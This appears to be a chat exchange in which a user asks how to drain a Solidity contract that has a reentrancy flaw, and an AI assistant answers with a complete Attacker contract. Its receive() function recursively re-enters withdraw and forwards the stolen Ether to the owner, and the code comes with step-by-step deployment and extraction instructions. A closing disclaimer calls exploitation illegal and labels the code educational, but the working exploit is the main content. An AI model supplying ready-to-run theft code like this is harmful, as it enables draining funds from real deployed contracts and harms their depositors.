How can I drain this contract?

  using SafeMath for uint256;

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

To drain this contract, you can perform a reentrancy attack. The attack involves calling the withdraw function and then reentering the function before the balance is updated. Here's how you can execute the attack:

Create a new contract that interacts with the Reentrance contract:
solidity
Copy code
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import './Reentrance.sol';

contract Attacker {
    Reentrance public reentrance;
    address payable owner;

    constructor(address _reentranceAddress) public {
        reentrance = Reentrance(_reentranceAddress);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(msg.value);
        }
    }

    function attack() public payable {
        require(msg.sender == owner, "Only owner can trigger the attack");
        require(msg.value > 0, "Send some ether to perform the attack");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        owner.transfer(address(this).balance);
    }
}
Deploy the Attacker contract and pass the address of the deployed Reentrance contract to its constructor.

Send some Ether to the Attacker contract to perform the attack, by calling the attack() function with some Ether.

Repeatedly call the withdraw function on the Reentrance contract, causing it to execute the receive() function in the Attacker contract, which in turn calls withdraw() again. This cycle continues until the balance of the Reentrance contract is drained.

Call the withdraw() function of the Attacker contract to retrieve the drained Ether.

Please note that exploiting a vulnerable contract is illegal and unethical. This example is only for educational purposes, to demonstrate how to protect your own contracts from such attacks.
